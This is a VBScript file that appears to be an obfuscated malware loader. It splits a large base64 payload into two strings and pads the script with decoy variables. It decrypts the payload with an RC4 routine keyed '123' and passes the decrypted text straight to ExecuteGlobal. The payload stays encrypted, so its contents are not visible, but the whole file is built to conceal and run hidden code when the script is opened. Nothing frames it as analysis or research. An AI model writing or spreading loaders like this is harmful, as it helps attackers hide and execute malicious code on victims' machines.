Option Explicit

Dim DummyVar1, DummyVar2, DummyArray(5)
DummyVar1 = "Неиспользуемый текст"
DummyVar2 = 12345

Dim Part1, Part2, Combined
Part1 = "dPCfgth0OfsYYz6KQxuAsU2I+CV/fkFS5P+du3KK1/b6Mza+1RQTwJkRdhXUM1Z4zvNUz+3mDTO10wHiyGVdB7jKbYM0XO1Pewjuhs1r9RDbofT0mNTfii9WCo32KjYhuYTFn9Ni8H1DMxVr+MVsL8kiXnFtLZw0UNf/e004xqQQZuCt7+d160iSTJqTTkYPTcVfQU8GGyF/g+g9XFU8y06BRujw6CjusVAvtlvRFasfVdxMV5adrCCpX1K/MCA1QjCwG3BkRDWwqZ6+gjbkfzxEIIo2fNW7WzaHF2giXZIZAmhIk+MBrG703H2drv0D3sgemKjoWPBswlABBa2YIsmNR65/kX9cLJIGHaV+KQ1MKxkIB97pLpJytyLq6vOn285KLgZvlsd2cFzkK8RSlIHY3k3vWyteXZd/R4wQR6+WhCLiIQXE59NuP3yLUIX8R0McLotBHpyR4ui6Q+IkfZLZRaROM0x9Mf74hqf+fGfzl/tyjCZj+0kRxFMLIesun9ifIslOcVp1waPhZYOc+S9thygynwB99mGYyr/OjKgpBNnF5TdF/fJyHEN/MKmCNEbA2wa6XpnQRFI1mOZHrwF5YPYyXnGDVG3ZrkA7HxuPO92YIWqbnccn8T7A5Yd/f5Ip0sGsBSZ/2Z/ctcPmOFpy+Rv9EYHLhsgp1EBM2HEpvqgrlglWaqZGdAXdanEJBFvWJQEfWzm5buW3C+Am1dSiiB61YNQhoHaDscGpzJCgWSC+Xjgr12LNr8GjQpqXu9h/rfGcEHTo2oS1QnYPwRbDPOsTt23OBxy2dlWDT3aapOeEWG5JaVb/79/OYrCBSQ8CR/VidVDKFRGiFejBsWqqSAEekqNHERUL25KpCRMOgYZbNXhNkCgGSDZiQ+dx+g0UhN9FUcBUrVyFxuzSUrQpFHZ5k4etFX8TkAYQAVQXdQ/ReH1JqSGZQTJihuCijwUNMj/Gw168gWh/DwsrW0Y5S7TPFOLYVRLYvY2jTZJApNCG9UnqpgJlKi85DMHW8lLMsq+BoGlLPTTXTlRvFxf5HglfpYqPa1C8CoaI6NVLFvC4y51mg4qiGTJjFHRSmJbaSZMGtjqSWJCMMCZ6rHDWEox9ug5Saa+TiFRVaa81FBOtP7SOD6Z1UGTI7Yvu8UOskIMJSSERKeYa91YpkBpNT6spwHunPODqjVvvOqkqqk8aoJXxZecjXUWO9ZIh24hArmYXe3DxHABf8YYxosejE9gIuF81kpQdThY8AjnsNigLCPfopGaEvSV4N/rHY+JVzDCXxHIea/T7cC3wPrGWg4IKYNBMoof+Nx5eBddt3NU5iuvxt8RzZxx9FqPTkFy8GGX4HpD++S90LxeF5Hnt+1SxFa1J3tXjoqjPTGri2avY9C08oAtZaNInMOFPcphAmotTYXzxAXK1k4w8aH343D+nnr4PdfGeaMJ0r7mujAW8zaR3RcQ9/aZ9/n+r1P4EH2f9P8nJ8fPBVLILOAeuFYpym8t64JFoyoAA7mzbxSJ"
Part2 = "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"
Combined = Part1 & Part2

Class CryptoWrapper
    Private m_key
    
    Private Sub Class_Initialize()
        m_key = BuildKey(Array(49, 50, 51))
    End Sub
    
    Private Function BuildKey(arr)
        Dim i, result
        For i = 0 To UBound(arr)
            result = result & Chr(arr(i))
        Next
        BuildKey = result
    End Function
    
    Public Function DecodeData(b64Data)
        Dim decoded
        decoded = DecodeBase64(b64Data)
        decoded = TransformData(decoded, m_key)
        DecodeData = ConvertToText(decoded)
    End Function
    
    Private Function DecodeBase64(input)
        Dim provider, elem
        Set provider = CreateObject("MSXML2.DOMDocument.3.0")
        Set elem = provider.CreateElement("tmp")
        elem.DataType = "bin.base64"
        elem.Text = input
        DecodeBase64 = elem.nodeTypedValue
    End Function
    
    Private Function TransformData(data, key)
        Dim S(255), i, j, k, temp
        Dim result(), cnt
        
        For i = 0 To 255
            S(i) = i
        Next
        
        j = 0
        For i = 0 To 255
            j = (j + S(i) + Asc(Mid(key, (i Mod Len(key)) + 1, 1))) Mod 256
            temp = S(i)
            S(i) = S(j)
            S(j) = temp
        Next
        
        i = 0: j = 0
        cnt = LenB(data)
        ReDim result(cnt - 1)
        
        For k = 1 To cnt
            i = (i + 1) Mod 256
            j = (j + S(i)) Mod 256
            temp = S(i)
            S(i) = S(j)
            S(j) = temp
            
            Dim keyStream
            keyStream = S((S(i) + S(j)) Mod 256)
            result(k-1) = AscB(MidB(data, k, 1)) Xor keyStream
        Next
        
        Dim outBytes
        outBytes = ""
        For k = 0 To cnt - 1
            outBytes = outBytes & ChrB(result(k))
        Next
        
        TransformData = outBytes
    End Function
    
    Private Function ConvertToText(bytes)
        Dim text, i
        text = ""
        For i = 1 To LenB(bytes) Step 2
            Dim byte1, byte2
            byte1 = AscB(MidB(bytes, i, 1))
            byte2 = AscB(MidB(bytes, i + 1, 1))
            text = text & ChrW(byte2 * 256 + byte1)
        Next
        ConvertToText = text
    End Function
End Class

DummyArray(0) = Now()
DummyVar1 = DummyVar1 & CStr(DummyVar2 * 0)

Dim processor
Set processor = New CryptoWrapper

Dim result
result = processor.DecodeData(Combined)

Dim stage1, stage2
stage1 = result
stage2 = stage1
ExecuteGlobal stage2
